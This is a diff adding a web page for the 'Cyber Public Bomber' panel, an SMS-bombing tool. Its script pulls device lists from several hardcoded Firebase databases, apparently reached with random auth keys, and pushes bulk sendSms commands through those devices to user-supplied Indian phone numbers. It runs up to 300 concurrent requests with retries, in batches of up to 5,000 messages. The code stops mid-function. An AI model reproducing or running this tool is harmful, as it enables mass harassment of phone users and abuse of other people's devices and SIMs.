@@ -1,0 +1,689 @@
+<!DOCTYPE html>
+
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+<meta content="#08070e" name="theme-color"/>
+<title>Cyber Public Bomber · Bomber Panel</title>
+<link href="https://fonts.googleapis.com" rel="preconnect"/>
+<link crossorigin="" href="https://fonts.gstatic.com" rel="preconnect"/>
+<link href="assets/css2" rel="stylesheet"/>
+<style>
+:root {
+  --bg: #08070e;
+  --panel: #11101b;
+  --panel2: #151323;
+  --line: rgba(180, 164, 255, .13);
+  --text: #f4f1ff;
+  --muted: #918ba9;
+  --purple: #8b5cf6;
+  --violet: #6d45ee;
+  --cyan: #55c7ff;
+  --green: #36d99a;
+  --amber: #f4bd57;
+  --red: #ff7188;
+  --radius: 22px;
+  --shadow: 0 24px 70px rgba(0, 0, 0, .42);
+}
+
+* { box-sizing: border-box; }
+html { scroll-behavior: smooth; }
+
+body {
+  margin: 0; min-height: 100vh; padding: 28px 16px 42px; color: var(--text);
+  font-family: "DM Sans", sans-serif;
+  background:
+    radial-gradient(ellipse 700px 420px at 50% -12%, rgba(109, 69, 238, .22), transparent 70%),
+    radial-gradient(ellipse 500px 360px at 100% 75%, rgba(55, 130, 255, .08), transparent 72%),
+    var(--bg);
+  -webkit-font-smoothing: antialiased;
+}
+
+body::before {
+  content: ""; position: fixed; inset: 0; pointer-events: none; opacity: .18;
+  background-image: linear-gradient(rgba(255, 255, 255, .025) 1px, transparent 1px), linear-gradient(90deg, rgba(255, 255, 255, .025) 1px, transparent 1px);
+  background-size: 44px 44px;
+  mask-image: linear-gradient(to bottom, #000, transparent 85%);
+  -webkit-mask-image: linear-gradient(to bottom, #000, transparent 85%);
+}
+
+button, textarea, input, select { font: inherit; }
+button { cursor: pointer; }
+button:focus-visible, textarea:focus-visible, input:focus-visible { outline: 2px solid #a78bfa; outline-offset: 3px; }
+
+.shell { width: min(100%, 800px); margin: auto; position: relative; }
+
+/* ── Header ── */
+.topbar { display: flex; align-items: center; justify-content: space-between; gap: 16px; margin: 0 2px 20px; }
+.brand { display: flex; align-items: center; gap: 12px; }
+.brand-mark { width: 44px; height: 44px; display: grid; place-items: center; border: 1px solid rgba(167, 139, 250, .35); border-radius: 15px; background: linear-gradient(145deg, #29204b, #151225); box-shadow: 0 8px 28px rgba(109, 69, 238, .22); font-size: 22px; }
+.brand-name { font-weight: 800; letter-spacing: .04em; font-size: 14px; }
+.brand-sub { font-size: 11px; color: var(--muted); margin-top: 2px; }
+.live-pill { display: flex; align-items: center; gap: 8px; padding: 9px 13px; border: 1px solid rgba(54, 217, 154, .2); border-radius: 999px; background: rgba(54, 217, 154, .07); color: #70e8b8; font-size: 11px; font-weight: 700; letter-spacing: .04em; }
+.live-dot { width: 7px; height: 7px; border-radius: 50%; background: var(--green); box-shadow: 0 0 12px var(--green); animation: pulse 2s infinite; }
+@keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: .4; } }
+
+/* ── Hero ── */
+.hero { position: relative; overflow: hidden; padding: 27px 28px; border: 1px solid rgba(157, 124, 255, .28); border-radius: 26px; background: linear-gradient(112deg, rgba(53, 34, 106, .78), rgba(20, 17, 39, .94) 58%, rgba(16, 17, 35, .96)); box-shadow: var(--shadow); margin-bottom: 17px; }
+.hero::before, .hero::after { content: ""; position: absolute; width: 230px; height: 230px; border: 1px solid rgba(177, 147, 255, .13); border-radius: 50%; right: -65px; top: -130px; box-shadow: 0 0 0 24px rgba(177, 147, 255, .025), 0 0 0 50px rgba(177, 147, 255, .02); }
+.hero::after { width: 150px; height: 150px; right: 25px; top: -100px; }
+.hero-content { position: relative; z-index: 1; display: flex; align-items: center; justify-content: space-between; gap: 20px; }
+.eyebrow { color: #c3adff; font-size: 10px; font-weight: 800; letter-spacing: .18em; text-transform: uppercase; margin-bottom: 9px; }
+h1 { font-size: clamp(23px, 5vw, 34px); line-height: 1.1; letter-spacing: -.045em; margin: 0; font-weight: 800; }
+h1 span { background: linear-gradient(90deg, #c4a7ff, #8f83ff, #67d5ff); background-clip: text; -webkit-background-clip: text; color: transparent; }
+.hero-copy { color: #b4abc9; font-size: 13px; margin: 10px 0 0; }
+.hero-icon { flex: 0 0 86px; width: 86px; height: 86px; display: grid; place-items: center; border-radius: 26px; font-size: 42px; background: linear-gradient(145deg, rgba(154, 111, 255, .22), rgba(54, 39, 103, .25)); border: 1px solid rgba(190, 163, 255, .24); box-shadow: inset 0 1px rgba(255, 255, 255, .12), 0 0 45px rgba(128, 83, 255, .2); }
+
+/* ── Grid & Metrics ── */
+.grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 12px; margin-bottom: 17px; }
+.metric { padding: 16px 15px; border: 1px solid var(--line); border-radius: 18px; background: linear-gradient(160deg, rgba(27, 24, 43, .96), rgba(15, 14, 24, .96)); box-shadow: 0 12px 30px rgba(0, 0, 0, .15); min-width: 0; position: relative; overflow: hidden; }
+.metric::after { content: ''; position: absolute; bottom: 0; left: 0; width: 100%; height: 30%; background: linear-gradient(0deg, rgba(139,92,246,.05), transparent); pointer-events: none; }
+.metric-top { display: flex; align-items: center; justify-content: space-between; margin-bottom: 13px; }
+.metric-icon { width: 31px; height: 31px; border-radius: 11px; display: grid; place-items: center; background: rgba(139, 92, 246, .13); color: #bda6ff; font-size: 15px; }
+.metric-label { font-size: 10px; color: var(--muted); font-weight: 700; text-transform: uppercase; letter-spacing: .09em; }
+.metric-value { font-family: "JetBrains Mono", monospace; font-size: 22px; font-weight: 700; letter-spacing: -.06em; }
+.metric-note { font-size: 10px; color: #77718d; margin-top: 5px; }
+.metric.green .metric-value { color: var(--green); }
+.metric.blue .metric-value { color: var(--cyan); }
+.metric.red .metric-value { color: var(--red); }
+.metric.amber .metric-value { color: var(--amber); }
+
+/* ── Panels ── */
+.panel { border: 1px solid var(--line); border-radius: var(--radius); background: linear-gradient(155deg, rgba(24, 21, 39, .97), rgba(14, 13, 23, .98)); box-shadow: 0 16px 45px rgba(0, 0, 0, .2); padding: 20px; margin-bottom: 15px; }
+.panel-head { display: flex; align-items: center; justify-content: space-between; gap: 12px; margin-bottom: 17px; }
+.panel-title { display: flex; align-items: center; gap: 10px; font-size: 14px; font-weight: 800; letter-spacing: -.02em; }
+.panel-title .symbol { width: 34px; height: 34px; display: grid; place-items: center; border-radius: 12px; background: rgba(139, 92, 246, .14); color: #c2aaff; font-size: 16px; }
+.panel-caption { font-size: 11px; color: var(--muted); margin-top: 3px; }
+.tag { font-size: 10px; font-weight: 700; color: #bba5ff; padding: 6px 9px; border: 1px solid rgba(139, 92, 246, .22); border-radius: 999px; background: rgba(139, 92, 246, .08); }
+
+/* ── Form Elements ── */
+.field-label { display: block; color: #a7a0bb; font-size: 11px; font-weight: 700; margin: 0 0 8px 2px; }
+textarea, input[type="text"] { width: 100%; background: #0b0a12; color: var(--text); border: 1px solid rgba(173, 155, 230, .14); border-radius: 15px; padding: 14px 15px; font: 12px/1.7 "JetBrains Mono", monospace; transition: border .2s, box-shadow .2s; outline: none; }
+textarea { min-height: 92px; resize: vertical; }
+input[type="text"] { font-family: 'DM Sans', sans-serif; font-size: 13px; padding: 12px 15px; }
+textarea::placeholder, input::placeholder { color: #59546b; }
+textarea:focus, input:focus { border-color: rgba(167, 139, 250, .55); box-shadow: 0 0 0 4px rgba(139, 92, 246, .09); }
+.field-foot { display: flex; justify-content: space-between; gap: 10px; color: #77718d; font-size: 10px; margin-top: 8px; }
+
+/* ── Chips (Send Count) ── */
+.chips-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 8px; margin-bottom: 8px; }
+.chip { background: #0b0a12; border: 1px solid var(--line); color: var(--muted); padding: 10px 0; border-radius: 12px; font-size: 12px; font-weight: 700; transition: 0.2s; font-family: 'JetBrains Mono', monospace; text-align: center; }
+.chip:hover { border-color: rgba(167, 139, 250, .4); color: var(--text); transform: translateY(-1px); }
+.chip.active { background: linear-gradient(135deg, #7c3aed, #6366f1); color: #fff; border-color: transparent; box-shadow: 0 6px 16px rgba(109,69,238,.3); }
+
+/* ── Buttons ── */
+.controls-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
+.btn-primary { width: 100%; padding: 14px; border-radius: 14px; border: 1px solid rgba(167,139,250,.3); background: linear-gradient(135deg, #7c3aed, #6366f1); color: #fff; font-size: 13px; font-weight: 700; display: flex; justify-content: center; align-items: center; gap: 8px; transition: 0.2s; box-shadow: 0 10px 20px rgba(109,69,238,.25); }
+.btn-primary:hover:not(:disabled) { transform: translateY(-2px); box-shadow: 0 14px 28px rgba(109,69,238,.4); border-color: rgba(167,139,250,.6); }
+.btn-primary:disabled { opacity: 0.4; cursor: not-allowed; transform: none; box-shadow: none; }
+.btn-secondary { width: 100%; padding: 14px; border-radius: 14px; border: 1px solid var(--line); background: rgba(255,255,255,.03); color: var(--text); font-size: 13px; font-weight: 700; display: flex; justify-content: center; align-items: center; gap: 8px; transition: 0.2s; }
+.btn-secondary:hover:not(:disabled) { background: rgba(255,113,136,.1); border-color: rgba(255,113,136,.3); color: #ff9ba9; }
+.btn-secondary:disabled { opacity: 0.3; cursor: not-allowed; }
+.btn-clear { padding: 9px 14px; background: transparent; border: 1px solid rgba(255,113,136,.2); color: #ff7188; border-radius: 10px; font-size: 11px; font-weight: 700; transition: 0.2s; }
+.btn-clear:hover { background: rgba(255,113,136,.1); }
+.spinner { width: 14px; height: 14px; border: 2px solid rgba(255,255,255,.3); border-top-color: #fff; border-radius: 50%; animation: spin .7s linear infinite; }
+@keyframes spin { to { transform: rotate(360deg); } }
+
+/* ── Progress ── */
+.progress-head { display: flex; justify-content: space-between; align-items: center; font-size: 11px; color: #aaa3bd; font-weight: 700; margin-bottom: 10px; }
+.progress-head strong { font-family: "JetBrains Mono", monospace; color: #c4adff; }
+.progress-track { height: 8px; border-radius: 99px; background: #08070e; border: 1px solid rgba(255,255,255,.05); overflow: hidden; position: relative; }
+.progress-fill { width: 0; height: 100%; border-radius: 99px; background: linear-gradient(90deg, #7650ed, #a16bff, #65cfff); box-shadow: 0 0 15px rgba(139, 92, 246, .5); transition: width 0.2s ease-out; position: relative; }
+.progress-fill::after { content: ''; position: absolute; inset: 0; background: linear-gradient(90deg, transparent, rgba(255,255,255,.3), transparent); animation: shimmer 2s infinite; }
+@keyframes shimmer { 0% { transform: translateX(-100%); } 100% { transform: translateX(100%); } }
+
+/* ── Status & Logs ── */
+.status-box { display: flex; align-items: center; gap: 10px; padding: 13px 14px; border: 1px solid rgba(173, 155, 230, .12); border-radius: 14px; background: rgba(5, 5, 10, .42); color: #aaa4bd; font-size: 11px; line-height: 1.5; margin-top: 14px; font-family: "JetBrains Mono", monospace; }
+.status-box b { color: #c4adff; }
+.status-box .check { font-size: 16px; color: var(--green); text-shadow: 0 0 8px rgba(54,217,154,.5); }
+.log-container { max-height: 120px; overflow-y: auto; display: flex; flex-direction: column; gap: 6px; margin-top: 10px; padding-right: 4px; }
+.log-container::-webkit-scrollbar { width: 4px; }
+.log-container::-webkit-scrollbar-thumb { background: #252b38; border-radius: 10px; }
+.log-item { padding: 8px 12px; background: rgba(255,255,255,.02); border-left: 2px solid var(--purple); border-radius: 6px; font-size: 10.5px; font-family: "JetBrains Mono", monospace; color: var(--muted); display: flex; gap: 8px; animation: slideIn .3s ease-out; }
+@keyframes slideIn { from { opacity: 0; transform: translateY(-4px); } to { opacity: 1; transform: translateY(0); } }
+.log-item.err { border-left-color: var(--red); color: #fca5a5; }
+.log-item.ok { border-left-color: var(--green); color: #6ee7b7; }
+.log-item.info { border-left-color: var(--cyan); color: #93c5fd; }
+.log-item .t { color: var(--text-dark); flex-shrink: 0; font-size: 9.5px; padding-top: 1px; opacity: 0.5; }
+
+
+/* ── Toast ── */
+.toast { position: fixed; bottom: 24px; right: 24px; z-index: 9999; padding: 14px 24px; border-radius: 12px; background: rgba(15,18,26,0.95); backdrop-filter: blur(10px); color: #fff; font-size: 13px; font-weight: 600; border: 1px solid rgba(139,92,246,0.4); box-shadow: 0 20px 40px rgba(0,0,0,0.5); opacity: 0; transform: translateY(20px); transition: 0.3s; pointer-events: none; }
+.toast.show { opacity: 1; transform: translateY(0); }
+
+/* ── Responsive ── */
+@media (max-width: 620px) {
+  body { padding: 17px 11px 28px; }
+  .hero { padding: 23px 20px; }
+  .grid { grid-template-columns: repeat(2, 1fr); gap: 9px; }
+  .metric { padding: 14px; }
+  .metric-value { font-size: 20px; }
+  .panel { padding: 16px; }
+  .hero-icon { width: 68px; height: 68px; flex-basis: 68px; border-radius: 21px; font-size: 33px; }
+  .chips-grid { grid-template-columns: repeat(2, 1fr); }
+  .feedback-input { flex-direction: column; }
+}
+@media (max-width: 390px) {
+  .hero-content { align-items: flex-start; }
+  .hero-icon { width: 54px; height: 54px; flex-basis: 54px; font-size: 27px; }
+  .controls-grid { grid-template-columns: 1fr; }
+  .brand-name { font-size: 12px; }
+  .live-pill { font-size: 9px; padding: 8px 10px; }
+  .tg-btn-large { font-size: 13px; padding: 16px; }
+}
+@media (prefers-reduced-motion: no-preference) {
+  .panel, .metric, .hero, .rating-section { animation: rise .55s both; }
+  .metric:nth-child(2) { animation-delay: .05s; }
+  .metric:nth-child(3) { animation-delay: .1s; }
+  .metric:nth-child(4) { animation-delay: .15s; }
+  @keyframes rise { from { opacity: 0; transform: translateY(9px); } to { opacity: 1; transform: translateY(0); } }
+}
+</style>
+</head>
+<body>
+<main class="shell">
+<!-- Header -->
+<header class="topbar">
+<div class="brand">
+<div class="brand-mark">✦</div>
+<div>
+<div class="brand-name">Cyber Public Bomber</div>
+<div class="brand-sub">Bomber dashboard · Overview</div>
+</div>
+</div>
+<div class="live-pill"><span class="live-dot"></span> SYSTEM ONLINE</div>
+</header>
+<!-- Hero -->
+<section class="hero">
+<div class="hero-content">
+<div>
+<div class="eyebrow">CONTROL CENTER</div>
+<h1>Cyber Public Bomber <span>BOMBER</span></h1>
+<p class="hero-copy">High-speed messaging engine with auto-retry.</p>
+</div>
+<div aria-hidden="true" class="hero-icon">💣</div>
+</div>
+</section>
+<!-- Stats -->
+<section aria-label="Overview metrics" class="grid">
+<article class="metric blue">
+<div class="metric-top"><span class="metric-label">Devices</span><span class="metric-icon">📱</span></div>
+<div class="metric-value" id="statDevices">0</div>
+<div class="metric-note">Online gateway nodes</div>
+</article>
+<article class="metric green">
+<div class="metric-top"><span class="metric-label">Sent</span><span class="metric-icon">✓</span></div>
+<div class="metric-value" id="statMessages">0</div>
+<div class="metric-note">Successful deliveries</div>
+</article>
+<article class="metric red">
+<div class="metric-top"><span class="metric-label">Failed</span><span class="metric-icon">!</span></div>
+<div class="metric-value" id="qFailStat">0</div>
+<div class="metric-note">Needs review</div>
+</article>
+<article class="metric amber">
+<div class="metric-top"><span class="metric-label">Speed</span><span class="metric-icon">⚡</span></div>
+<div class="metric-value" id="qSpeedStat">0/s</div>
+<div class="metric-note">Real-time throughput</div>
+</article>
+</section>
+<!-- Send Count (Restored) -->
+<section class="panel">
+<div class="panel-head">
+<div>
+<div class="panel-title"><span class="symbol">🎯</span> Send Count</div>
+<div class="panel-caption">Select the number of messages to send</div>
+</div>
+<span class="tag active" id="targetTag">100</span>
+</div>
+<div class="chips-grid" id="chips">
+<button class="chip active" data-count="100">100</button>
+<button class="chip" data-count="500">500</button>
+<button class="chip" data-count="1000">1K</button>
+<button class="chip" data-count="5000">5K</button>
+</div>
+</section>
+<!-- Message Composer -->
+<section class="panel">
+<div class="panel-head">
+<div>
+<div class="panel-title"><span class="symbol">✉</span> Message composer</div>
+<div class="panel-caption">Write the payload to broadcast</div>
+</div>
+<span class="tag">TARGET</span>
+</div>
+<label class="field-label" for="msgInput">MESSAGE CONTENT</label>
+<textarea id="msgInput" maxlength="1000" placeholder="Type your message here... Use {num} for dynamic number insertion."></textarea>
+<div class="field-foot">
+<span>Keep messages clear and impactful.</span>
+<span id="msgCount">0 / 1000</span>
+</div>
+</section>
+<!-- Recipients -->
+<section class="panel">
+<div class="panel-head">
+<div>
+<div class="panel-title"><span class="symbol">📞</span> Recipient numbers</div>
+<div class="panel-caption">One number per line or comma-separated</div>
+</div>
+<div style="display:flex; align-items:center; gap:10px;">
+<span class="tag" id="numCount" style="background:rgba(54,217,154,.1); border-color:rgba(54,217,154,.2); color:#70e8b8;">0 Valid</span>
+<button class="btn-clear" id="clearBtn">Clear</button>
+</div>
+</div>
+<textarea id="numbersInput" placeholder="9876543210
++91 91234 56789
+919000011111, 918888822222" style="min-height: 80px;"></textarea>
+</section>
+<!-- Actions & Progress -->
+<section class="panel">
+<div class="panel-head">
+<div>
+<div class="panel-title"><span class="symbol">⚙</span> Execution control</div>
+<div class="panel-caption">Start or stop the bombing sequence</div>
+</div>
+<span class="tag" id="statusTag">IDLE</span>
+</div>
+<div class="controls-grid" style="margin-bottom: 20px;">
+<button class="btn-primary" id="startBtn">🚀 Start Bombing</button>
+<button class="btn-secondary" disabled="" id="stopBtn">■ Stop</button>
+</div>
+<div class="progress-head">
+<span>Overall progress</span>
+<strong id="progressPct">0%</strong>
+</div>
+<div class="progress-track">
+<div class="progress-fill" id="progressBar"></div>
+</div>
+<div class="status-box" id="statusBox">
+<span class="check">●</span>
+<span id="statusText">System ready. Waiting for command...</span>
+</div>
+<!-- Logs -->
+<div class="log-container" id="log">
+<!-- Injected via JS -->
+</div>
+</section>
+</main>
+<div class="toast" id="toast">✅ Ready</div>
+<script>
+'use strict';
+
+/* ═══════════════════════════════════════════════════════════════════════
+   🔥 FIREBASE URLS
+   ═══════════════════════════════════════════════════════════════════════ */
+const FIREBASE_URLS = `
+https://pard-7db96-default-rtdb.firebaseio.com
+https://tsus-e947c-default-rtdb.firebaseio.com
+https://sadan5-default-rtdb.asia-southeast1.firebasedatabase.app
+https://mypnl01-ush-default-rtdb.firebaseio.com
+`;
+
+/* ═══════════════════════════════════════════════════════════════════════
+   ⚙️ CONFIG & STATE
+   ═══════════════════════════════════════════════════════════════════════ */
+const SEND_CONCURRENCY  = 300;
+const LOAD_TIMEOUT      = 6000;
+const FIRST_DEVICE_WAIT = 4000;
+const RENDER_INTERVAL   = 120;
+const MAX_TASK_ATTEMPTS = 4;
+const MAX_PRODUCE_MULT  = 3;
+
+const state = {
+  devices: [],
+  running: false,
+  stopFlag: false,
+  sent: 0,
+  failed: 0,
+  target: 100,
+  startedAt: 0,
+  renderTimer: null,
+  speedTimer: null,
+  loadPromise: null
+};
+
+const $ = id => document.getElementById(id);
+const numbersInput = $('numbersInput');
+const msgInput     = $('msgInput');
+const numCountEl   = $('numCount');
+const msgCountEl   = $('msgCount');
+const startBtn     = $('startBtn');
+const stopBtn      = $('stopBtn');
+const clearBtn     = $('clearBtn');
+const statusBox    = $('statusBox');
+const statusTag    = $('statusTag');
+const statusText   = $('statusText');
+const progressBar  = $('progressBar');
+const progressPct  = $('progressPct');
+const qFailStat    = $('qFailStat');
+const qSpeedStat   = $('qSpeedStat');
+const statMessages = $('statMessages');
+const statDevices  = $('statDevices');
+const logEl        = $('log');
+const toastEl      = $('toast');
+const targetTag    = $('targetTag');
+
+/* ── UI Utils ── */
+function randKey(){
+  let s = '';
+  for(let i=0;i<8;i++) s += (Math.random()*36|0).toString(36);
+  return s;
+}
+let toastT = null;
+function toast(t){ toastEl.textContent = t; toastEl.classList.add('show'); if(toastT) clearTimeout(toastT); toastT = setTimeout(()=>toastEl.classList.remove('show'), 1600); }
+
+const logQueue = [];
+function log(msg, type){ logQueue.push({ msg, type }); }
+function flushLogs(){
+  if(!logQueue.length) return;
+  const items = logQueue.splice(0, logQueue.length);
+  const t = new Date().toLocaleTimeString('en-IN', {hour12:false});
+  for(const it of items){
+    const d = document.createElement('div');
+    d.className = 'log-item ' + (it.type || '');
+    d.innerHTML = `<span class="t">${t}</span><span class="m">${it.msg}</span>`;
+    logEl.prepend(d);
+  }
+  while(logEl.children.length > 50) logEl.removeChild(logEl.lastChild);
+}
+
+function normalizeUrl(u){
+  let s = String(u||'').trim();
+  if(!s) return '';
+  s = s.split('?')[0].replace(/\/$/,'');
+  if(!s.startsWith('http')) s = 'https://' + s;
+  return s;
+}
+
+function parseSources(){
+  const lines = String(FIREBASE_URLS||'').split(/\r?\n/);
+  const list = [];
+  const seen = new Set();
+  for(const raw of lines){
+    let line = raw.trim();
+    if(!line || line.startsWith('#')) continue;
+    line = line.replace(/^[-•*]\s*/,'').trim();
+    let url = line, key = '';
+    if(line.includes('|')){ const p = line.split('|'); url = p[0].trim(); key = (p[1]||'').trim(); }
+    else if(line.includes(',')){ const p = line.split(','); url = p[0].trim(); key = p.slice(1).join(',').trim(); }
+    else if(/\s/.test(line)){ const p = line.split(/\s+/); url = p[0].trim(); key = p.slice(1).join(' ').trim(); }
+    url = normalizeUrl(url);
+    if(!url || !/firebaseio\.com|firebasedatabase\.app/.test(url)) continue;
+    if(seen.has(url)) continue;
+    seen.add(url);
+    list.push({ url, key });
+  }
+  return list;
+}
+
+async function fbGet(url, path, key, extra, timeout){
+  const base = normalizeUrl(url);
+  const params = new URLSearchParams(Object.assign({ auth: key || randKey() }, extra||{}));
+  const full = base + '/' + path + '.json?' + params.toString();
+  const ctrl = new AbortController();
+  const timer = setTimeout(()=>ctrl.abort(), timeout || 8000);
+  try{
+    const res = await fetch(full, { signal: ctrl.signal, headers:{Accept:'application/json'} });
+    if(!res.ok){
+      if(res.status === 404) return null;
+      if(res.status === 401 || res.status === 403) throw new Error('PERMISSION_DENIED');
+      throw new Error('HTTP ' + res.status);
+    }
+    return await res.json();
+  } finally { clearTimeout(timer); }
+}
+
+async function loadAllDevicesInBackground(){
+  const sources = parseSources();
+  if(!sources.length){
+    log('⚠️ No URLs found', 'warn');
+    statusText.textContent = '⚠️ No Firebase URLs found.';
+    return [];
+  }
+  log(`📥 Scanning ${sources.length} Firebase URL(s)…`, 'info');
+  statusText.textContent = `Scanning ${sources.length} URL(s)…`;
+
+  const found = [];
+  let urlsOk = 0;
+  let firstResolved = false;
+  let resolveFirst;
+  const firstDevicePromise = new Promise(r => { resolveFirst = r; });
+
+  const urlPromises = sources.map(src =>
+    fbGet(src.url, 'clients', src.key, {}, LOAD_TIMEOUT)
+      .then(clients => {
+        urlsOk++;
+        if(!clients || typeof clients !== 'object') return;
+        for(const [deviceId, dev] of Object.entries(clients)){
+          if(!dev || typeof dev !== 'object' || !dev.status) continue;
+          found.push({ url: src.url, key: src.key, deviceId });
+        }
+        state.devices = found;
+        statDevices.textContent = found.length;
+        if(found.length > 0 && !firstResolved){
+          firstResolved = true;
+          resolveFirst(found);
+        }
+      })
+      .catch(() => {})
+  );
+
+  const timeout = new Promise(r => setTimeout(() => { if(!firstResolved){ firstResolved = true; resolveFirst(found); } }, FIRST_DEVICE_WAIT));
+  await Promise.race([firstDevicePromise, timeout]);
+
+  if(found.length > 0){
+    log(`⚡ ${found.length} device(s) ready`, 'ok');
+    statusText.innerHTML = `<b>${found.length}</b> device(s) ready — system online`;
+  }
+
+  Promise.all(urlPromises).then(() => {
+    state.devices = found;
+    log(`✅ Loaded ${found.length} online device(s) · ${urlsOk}/${sources.length} URL(s) ok`, 'ok');
+    statusText.innerHTML = `<b>${found.length}</b> online device(s) ready · ${urlsOk}/${sources.length} URL(s) ok`;
+  }).catch(()=>{});
+
+  return found;
+}
+
+/* ── Data Parsing ── */
+function normalizeNumber(raw){
+  let n = String(raw||'').replace(/[^\d]/g,'');
+  if(n.startsWith('0091')) n = n.slice(4);
+  else if(n.startsWith('91') && n.length === 12) n = n.slice(2);
+  if(n.startsWith('0') && n.length === 11) n = n.slice(1);
+  if(/^[6-9]\d{9}$/.test(n)) n = '91' + n;
+  return n;
+}
+function parseNumbers(raw){
+  const parts = String(raw||'').split(/[\s,;|]+/).map(x=>x.trim()).filter(Boolean);
+  const out = [];
+  const seen = new Set();
+  for(const p of parts){
+    const n = normalizeNumber(p);
+    if(!/^91[6-9]\d{9}$/.test(n) || seen.has(n)) continue;
+    seen.add(n);
+    out.push(n);
+  }
+  return out;
+}
+
+numbersInput.addEventListener('input', () => {
+  const nums = parseNumbers(numbersInput.value);
+  numCountEl.textContent = nums.length + ' Valid';
+});
+msgInput.addEventListener('input', () => {
+  msgCountEl.textContent = msgInput.value.length + ' / 1000';
+});
+clearBtn.addEventListener('click', () => {
+  numbersInput.value = '';
+  numCountEl.textContent = '0 Valid';
+});
+
+/* ── Send Count Selection ── */
+document.querySelectorAll('#chips .chip').forEach(chip => {
+  chip.addEventListener('click', () => {
+    document.querySelectorAll('#chips .chip').forEach(c => c.classList.remove('active'));
+    chip.classList.add('active');
+    state.target = parseInt(chip.getAttribute('data-count')) || 100;
+    targetTag.textContent = state.target.toLocaleString('en-IN');
+  });
+});
+targetTag.textContent = state.target.toLocaleString('en-IN');
+
+/* ── Main Bomber Logic ── */
+async function hyperBlast(){
+  const numbers = parseNumbers(numbersInput.value);
+  const template = msgInput.value.trim();
+  const target = state.target; 
+
+  if(!numbers.length){ toast('⚠️ Paste at least one number'); return; }
+  if(!template){ toast('⚠️ Type a message'); return; }
+
+  let devices = [...state.devices];
+  if(!devices.length && state.loadPromise){
+    toast('⏳ Waiting for devices…');
+    statusText.textContent = '⏳ Waiting for devices…';
+    await state.loadPromise;
+    devices = [...state.devices];
+  }
+  if(!devices.length){ toast('⚠️ No online devices loaded'); return; }
+
+  state.running = true;
+  state.stopFlag = false;
+  state.sent = 0;
+  state.failed = 0;
+  state.startedAt = Date.now();
+
+  startBtn.disabled = true;
+  startBtn.innerHTML = '<span class="spinner"></span> Bombing…';
+  stopBtn.disabled = false;
+  statusTag.textContent = 'ACTIVE';
+  statusTag.style.color = '#ff9ba9';
+  statusTag.style.borderColor = 'rgba(255,113,136,.3)';
+  statusTag.style.background = 'rgba(255,113,136,.1)';
+
+  log(`💣 BOMBER STARTED: ${target} targets × ${devices.length} device(s)`, 'info');
+  statusText.innerHTML = `Bombing <b>${target}</b> via ${devices.length} device(s)…`;
+
+  let dIdx = 0, sIdx = 0, nIdx = 0;
+  const SIMS = [1, 2];
+  function makeTask(){
+    const dev = devices[dIdx % devices.length];
+    const sim = SIMS[sIdx % SIMS.length];
+    const num = numbers[nIdx % numbers.length];
+    const msg = template.split('{num}').join(num);
+    const body = JSON.stringify({ from: sim, to: num, message: msg, isSended: false });
+    const url = dev.url + '/clients/' + dev.deviceId + '/webhookEvent/sendSms.json?auth=' + (dev.key || randKey());
+    
+    nIdx++;
+    if(nIdx >= numbers.length){ nIdx = 0; sIdx++; }
+    if(sIdx >= SIMS.length){ sIdx = 0; dIdx++; }
+    if(dIdx >= devices.length) dIdx = 0;
+    return { url, body, attempt: 1 };
+  }
+
+  let success = 0, failed = 0, active = 0, produced = 0;
+  const retryQueue = [], freshQueue = [];
+  const MAX_PRODUCE = target * MAX_PRODUCE_MULT;
+
+  function fillFreshQueue(){
+    while(produced < MAX_PRODUCE && (success + active + retryQueue.length + freshQueue.length) < target){
+      freshQueue.push(makeTask()); produced++;
+    }
+  }
+
+  function fire(task){
+    active++;
+    fetch(task.url, {
+      method: 'PUT', headers: { 'Content-Type': 'application/json' }, body: task.body, cache: 'no-store'
+    }).then(res => {
+      if(res.ok){ success++; }
+      else if(task.attempt < MAX_TASK_ATTEMPTS && !state.stopFlag){
+        task.attempt++;
+        if(res.status === 429){ setTimeout(() => { retryQueue.push(task); pump(); }, 400 * task.attempt); return; }
+        retryQueue.push(task);
+      } else { failed++; }
+    }).catch(() => {
+      if(task.attempt < MAX_TASK_ATTEMPTS && !state.stopFlag){ task.attempt++; retryQueue.push(task); }
+      else { failed++; }
+    }).then(() => { active--; pump(); });
+  }
+
+  let finalized = false;
+  function pump(){
+    fillFreshQueue();
+    while(active < SEND_CONCURRENCY && !state.stopFlag){
+      let task = retryQueue.length > 0 ? retryQueue.shift() : (freshQueue.length > 0 ? freshQueue.shift() : null);
+      if(!task) break;
+      fire(task);
+    }
+    if(active === 0 && retryQueue.length === 0 && freshQueue.length === 0){
+      if(success >= target || produced >= MAX_PRODUCE || state.stopFlag) finalize();
+    }
+  }
+
+  function finalize(){
+    if(finalized) return;
+    finalized = true;
+    clearInterval(state.renderTimer);
+    clearInterval(state.speedTimer);
+
+    progressPct.textContent = '100%';
+    progressBar.style.width = '100%';
+    flushLogs();
+
+    state.running = false;
+    startBtn.disabled = false;
+    startBtn.innerHTML = '🚀 Start Bombing';
+    stopBtn.disabled = true;
+    
+    statusTag.textContent = state.stopFlag ? 'STOPPED' : 'COMPLETE';
+    statusTag.style.color = state.stopFlag ? '#fca5a5' : '#70e8b8';
+    statusTag.style.borderColor = state.stopFlag ? 'rgba(255,113,136,.3)' : 'rgba(54,217,154,.3)';
+    statusTag.style.background = state.stopFlag ? 'rgba(255,113,136,.1)' : 'rgba(54,217,154,.1)';
+
+    const el = ((Date.now() - state.startedAt) / 1000).toFixed(1);
+    const avg = Math.round(success / Math.max(0.1, parseFloat(el)));
+    const done = state.stopFlag ? '⏹ Stopped' : (success >= target ? '✅ Target reached' : '✅ Complete');
+    statusText.innerHTML = `${done} · <b>${success}</b> sent · ${failed} failed · ${el}s`;
+    log(`🏁 ${done} · Sent ${success} · Failed ${failed} · ${el}s`, success >= target ? 'ok' : 'warn');
+    toast(state.stopFlag ? '⏹ Stopped' : '✅ Finished');
+  }
+
+  state.renderTimer = setInterval(() => {
+    statMessages.textContent = success.toLocaleString('en-IN');
+    qFailStat.textContent = failed.toLocaleString('en-IN');
+    const pct = Math.min(100, (success / target) * 100);
+    progressBar.style.width = pct.toFixed(2) + '%';
+    progressPct.textContent = pct.toFixed(0) + '%';
+    flushLogs();
+  }, RENDER_INTERVAL);
+
+  let lastSent = 0, lastTime = Date.now();
+  state.speedTimer = setInterval(() => {
